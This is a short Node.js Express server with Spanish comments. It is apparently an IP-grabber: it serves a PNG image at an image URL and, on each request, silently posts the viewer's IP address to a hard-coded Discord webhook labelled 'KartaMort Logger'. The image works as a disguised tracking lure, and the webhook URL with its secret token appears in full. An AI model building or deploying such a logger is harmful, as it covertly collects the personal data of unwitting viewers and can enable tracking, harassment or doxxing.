const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args)); // Importar 'node-fetch'
const app = express();

// Ruta para servir la imagen
app.get('/img/:id.png', (req, res) => {
  // Usamos una ruta absoluta para asegurarnos que el archivo se encuentra correctamente
  const imagePath = path.join(__dirname, 'kartamort.png');  // Ruta absoluta a la imagen

  // Leemos la imagen usando fs.readFile
  fs.readFile(imagePath, (err, data) => {
    if (err) {
      // En caso de error al leer el archivo, devolvemos un error 500
      res.status(500).send('Error leyendo la imagen');
      return;
    }

    // Obtenemos la IP del visitante
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Configuramos el webhook de Discord
    const payload = {
      username: "KartaMort Logger",
      content: `IP: ${ip}`
    };

    // Usamos fetch para enviar la IP al webhook de Discord
    fetch("https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(err => console.error("Error en el webhook: ", err));

    // Establecemos el tipo de contenido como 'image/png'
    res.setHeader('Content-Type', 'image/png');
    // Enviamos la imagen al cliente
    res.send(data);
  });
});

// Configuramos el puerto del servidor
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Servidor corriendo en el puerto ${port}`);
});
